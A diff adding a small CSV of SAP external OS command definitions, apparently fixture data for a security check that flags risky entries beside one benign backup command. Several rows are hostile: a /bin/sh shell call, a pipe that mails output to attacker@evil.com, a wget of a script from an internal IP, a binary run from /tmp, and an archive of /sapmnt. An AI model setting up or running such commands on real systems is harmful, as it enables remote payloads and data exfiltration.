@@ -1,0 +1,8 @@
+NAME,OPSYSTEM,OPCOMMAND,PARAMETERS,ADDPAR
+ZBADSHELL,UNIX,/bin/sh,-c id,X
+ZPIPE,UNIX,/usr/bin/logger,| /usr/bin/mail attacker@evil.com,
+ZWGET,UNIX,/usr/bin/wget,http://10.0.0.9/x.sh,
+ZBARE,UNIX,backup_all,-full,
+ZTMP,UNIX,/tmp/maint.bin,,X
+ZANYOS,ANYOS,/usr/bin/tar,-czf /tmp/out.tgz /sapmnt,
+ZSAFE,UNIX,/usr/sbin/brbackup,-c force,
